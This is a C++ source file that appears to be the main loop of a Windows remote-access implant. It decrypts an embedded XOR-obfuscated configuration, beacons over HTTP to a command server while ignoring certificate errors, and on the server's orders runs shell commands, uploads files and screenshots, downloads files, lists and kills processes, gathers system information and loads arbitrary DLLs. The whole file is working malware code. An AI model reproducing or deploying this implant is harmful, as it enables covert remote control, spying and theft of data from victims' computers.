#include "core.h"

void mainloop() {
	Endpoints e;
	Configuration c;
	c.endpoints = e;
	std::string res = xorConfig((char*)CONFIG_BUFFER);
	initializeConfig(&c, res.c_str());
	std::cout << c.hostname << "\n";

	HANDLE hInternet = InternetOpenA(c.hostname.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hConnect = InternetConnectA(hInternet, c.hostname.c_str(), c.port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest = HttpOpenRequestA(hConnect, c.strings.post.c_str(), c.endpoints.heartbeat.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	HttpEndRequestA(hRequest, NULL, NULL, NULL);
	if(hRequest)
		InternetCloseHandle(hRequest);

	while (true) {
		HANDLE hRequest = HttpOpenRequestA(hConnect, c.strings.post.c_str(), c.endpoints.heartbeat.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
		std::string response = sendRequestGetResponse(hRequest);
		response = decode(c.key, response);
		//std::cout << response << "\n";
		// Attempt to parse decoded string as JSON, generate hash of action string
		nlohmann::json parsed;
		long code;
		try {
			parsed = nlohmann::json::parse(response);
			code = stringhash(parsed["action"]);
		} 
		catch (nlohmann::json::parse_error& ex) {
			std::cout << "Could not parse response as JSON" << "\n";
			code = 0;
		}
		
		//Process request here. 
		std::string outString;
		switch (code) {
		case 1883:
			//OK
			break;
		case 459983:
			//INFO
			outString = gatherInfo(&c.strings, hInternet);
			std::cout << outString << "\n";
			sendEncodedString(&c.strings, c.key, outString, c.endpoints.info, hConnect);
			break;
		case 1907:
			//PS
			outString = getProcToStr();
			std::cout << outString << "\n";
			sendEncodedString(&c.strings, c.key, outString, c.endpoints.ps, hConnect);
			break;
		case 7990316:
			//SHELL
			outString = execCmd(&c.strings, parsed["command"], c.cmdtimeout);
			std::cout << outString << "\n";
			sendEncodedString(&c.strings, c.key, outString, c.endpoints.out, hConnect);
			break;
		case 130495860:
			//UPLOAD
			doFileUpload(&c.strings, hConnect, (char*)parsed["path"].get<std::string>().c_str(), c.xorKey, c.endpoints.upload.c_str());
			break;
		case 1226493124:
			//DOWNLOAD
			doFileDownload(parsed["url"], parsed["path"]);
			break;
		case 466988:
			//KILL
			killProcess(parsed["pid"]);
			break;
		case 71109652:
			//SCREENSHOT
			doScreenshotUpload(&c.strings, hConnect, takeScreenshotAndSaveToMemory(), c.xorKey, c.endpoints.upload.c_str());
			break;
		case 1299521577:
			//LOADLIBRARY
			LoadLibraryA(parsed["path"].get<std::string>().c_str());
		default:
			break;
		}
		
		HttpEndRequestA(hRequest, NULL, NULL, NULL);
		if(hRequest)
			InternetCloseHandle(hRequest);
		Sleep(c.sleeptime);
	}
	return;
}